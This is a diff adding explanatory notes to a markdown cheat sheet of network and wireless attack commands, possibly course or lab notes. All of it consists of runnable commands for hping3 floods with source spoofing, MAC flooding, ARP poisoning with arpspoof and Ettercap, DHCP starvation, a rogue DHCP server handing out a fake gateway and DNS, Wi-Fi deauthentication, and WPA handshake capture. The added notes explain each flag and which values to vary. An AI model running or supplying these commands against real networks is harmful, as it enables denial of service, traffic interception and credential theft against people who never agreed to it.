@@ -31,6 +31,17 @@ Large packet flood:
 Using hping3:
 #### `sudo hping3 --flood --icmp <target_ip>`
 
+**Flag Notes**
+- `-f` → sends packets as fast as possible  
+- `-s` → changes packet size  
+- `--icmp` → chooses ICMP protocol  
+- `--flood` → removes delay between packets  
+
+Try changing:
+- packet size  
+- protocol  
+- target  
+
 ---
 
 ## SYN Flood
@@ -41,12 +52,30 @@ Flood a service port (example: SSH):
 More aggressive:
 #### `sudo hping3 -S --flood --rand-source -p 22 <target_ip>`
 
+**Flag Notes**
+- `-S` → sends SYN packets (start of TCP connection)  
+- `-p` → chooses port  
+- `--rand-source` → spoofs source IP  
+- `--flood` → sends continuously  
+
+Try changing:
+- port number  
+- adding or removing spoofing  
+
 ---
 
 ## UDP Flood
 
 Flood a UDP port:
 #### `sudo hping3 --flood --udp -p 53 <target_ip>`
+
+**Flag Notes**
+- `--udp` → uses UDP protocol  
+- `-p` → target port  
+- `--flood` → continuous send  
+
+Try changing:
+- ports commonly used by services  
 
 ---
 
@@ -57,6 +86,13 @@ Install tool:
 
 Run:
 #### `sudo macof -i <interface>`
+
+**Flag Notes**
+- `-i` → selects network interface  
+- Tool generates large numbers of fake MAC addresses  
+
+Try changing:
+- interface  
 
 ---
 
@@ -76,6 +112,16 @@ Terminal 1:
 Terminal 2:
 #### `sudo arpspoof -i <interface> -t <gateway_ip> <target_ip>`
 
+**Flag Notes**
+- `-i` → interface used  
+- `-t` → target being poisoned  
+- Last IP → system you are impersonating  
+
+What is happening:
+1. Tell victim you are gateway  
+2. Tell gateway you are victim  
+3. Traffic flows through attacker  
+
 ---
 
 ## Ettercap ARP Poisoning (GUI)
@@ -90,6 +136,10 @@ Steps:
 4. Add target 2 = gateway  
 5. MitM → ARP poisoning → Start  
 
+**What this does**
+- Automates the same steps as arpspoof  
+- Adds packet inspection capability  
+
 ---
 
 ## Gratuitous ARP Flood
@@ -97,6 +147,15 @@ Steps:
 Using nemesis:
 #### `sudo apt install -y nemesis`
 #### `sudo nemesis arp -v -d <target_ip> -S <fake_ip> -h <fake_mac>`
+
+**Flag Notes**
+- `-d` → destination  
+- `-S` → spoofed sender IP  
+- `-h` → spoofed MAC  
+- `-v` → verbose output  
+
+Try changing:
+- spoofed values  
 
 ---
 
@@ -113,6 +172,11 @@ Run interactive mode:
 Steps:
 1. Select DHCP
 2. Launch starvation attack
+
+**What is happening**
+- Many fake clients request addresses  
+- Pool runs out  
+- Real clients cannot obtain IP  
 
 ---
 
@@ -133,8 +197,14 @@ dhcp-option=3,<fake_gateway_ip>
 dhcp-option=6,<fake_dns_ip>
 ```
 
+
 Restart:
 #### `sudo systemctl restart dnsmasq`
+
+**What the options mean**
+- `dhcp-range` → addresses handed out  
+- `option 3` → gateway given to clients  
+- `option 6` → DNS server given to clients  
 
 ---
 
@@ -147,6 +217,9 @@ Restart:
 Enable monitor mode:
 #### `sudo airmon-ng start wlan0`
 
+**What this does**
+- Puts adapter into packet capture mode  
+
 ---
 
 ## Find targets
@@ -158,6 +231,10 @@ Record:
 - Channel
 - Client MAC
 
+**What to look for**
+- Which AP is active  
+- Which clients are connected  
+
 ---
 
 ## Deauth a client
@@ -166,6 +243,14 @@ Record:
 
 Deauth entire AP:
 #### `sudo aireplay-ng --deauth 50 -a <bssid> wlan0mon`
+
+**Flag Notes**
+- `--deauth` → number of packets sent  
+- `-a` → access point  
+- `-c` → client  
+
+Try changing:
+- packet count  
 
 ---
 
@@ -176,6 +261,10 @@ Install:
 
 Run:
 #### `sudo mdk4 wlan0mon d -B <bssid>`
+
+**Flag Notes**
+- `d` → deauth mode  
+- `-B` → target AP  
 
 ---
 
@@ -188,6 +277,11 @@ Start capture:
 
 Leave running.
 
+**Flag Notes**
+- `-c` → channel  
+- `--bssid` → target AP  
+- `-w` → output file  
+
 ---
 
 ## Force reconnect to capture handshake
@@ -195,9 +289,7 @@ Leave running.
 #### `sudo aireplay-ng --deauth 10 -a <bssid> wlan0mon`
 
 Watch for:
-```
 WPA handshake: <bssid>
-```
 
 ---
 
@@ -211,6 +303,10 @@ capture.csv
 
 Open:
 #### `wireshark capture.cap`
+
+**What you are verifying**
+- Handshake packets present  
+- Correct network  
 
 ---
 
@@ -227,6 +323,12 @@ Find active traffic:
 
 Watch packets:
 #### `sudo tcpdump -i <interface>`
+
+**What these tell you**
+- Interfaces  
+- Routes  
+- Traffic patterns  
+- Packet details  
 
 ---
 
